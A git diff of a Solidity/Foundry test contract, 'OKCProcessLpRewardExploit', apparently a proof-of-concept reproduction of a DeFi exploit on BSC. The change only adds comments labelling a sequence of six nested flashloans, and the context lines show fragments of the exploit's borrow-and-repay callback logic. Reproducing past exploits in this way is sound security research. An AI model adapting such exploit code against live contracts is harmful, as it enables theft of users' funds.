@@ -86,7 +86,7 @@ contract OKCProcessLpRewardExploit is Test {
     }
 
     function testStartExploit() public {
-
+        // First flashloan
         console2.log("Doing First Flashloan. (DPAADVANCED)");
         uint256 balance_dpaadvanced = IERC20(BSCUSD).balanceOf(DPAADVANCED);
         console2.log("First Amount:", balance_dpaadvanced);  
@@ -115,7 +115,7 @@ contract OKCProcessLpRewardExploit is Test {
         uint256 quoteAmount,
         bytes calldata data
     ) external {
-
+      /////// Second Flashloan
       if (msg.sender == DPAADVANCED) {
 
         console2.log("Doing Second Flashloan. (DPAORACLE)");
@@ -136,7 +136,7 @@ contract OKCProcessLpRewardExploit is Test {
         console2.log("Paying First Flashloan. (DPAADVANCED)");
         IERC20(BSCUSD).transfer(DPAADVANCED, quoteAmount);
       }
-
+      /////// Third Flashloan
       if (msg.sender == DPPORACLE) {
         console2.log("Doing Third Flashloan. (DPAORACLE_2)");
 
@@ -157,7 +157,7 @@ contract OKCProcessLpRewardExploit is Test {
         console2.log("Paying Second Flashloan. (DPPORACLE)");
         IERC20(BSCUSD).transfer(DPPORACLE, quoteAmount);
       }
-
+      /////// Fourth Flashloan
       if (msg.sender == DPPORACLE_2) {
         console2.log("Doing Fourth Flashloan. (DPP)");
 
@@ -178,7 +178,7 @@ contract OKCProcessLpRewardExploit is Test {
         console2.log("Paying Third Flashloan. (DPPORACLE_2)");
         IERC20(BSCUSD).transfer(DPPORACLE_2, quoteAmount);
       }
-
+      /////// Fifth Flashloan
       if (msg.sender == DPP) {
         console2.log("Doing Fifth Flashloan. (DPPORACLE_3)");
 
@@ -199,7 +199,7 @@ contract OKCProcessLpRewardExploit is Test {
         console2.log("Paying Fourth Flashloan. (DPP)");
         IERC20(BSCUSD).transfer(DPP, quoteAmount);
       } 
-
+      /////// Sixth Flashloan
       if (msg.sender == DPPORACLE_3) {
         console2.log("Doing Sixth Flashloan. (PANCAKEV3POOL)");
 
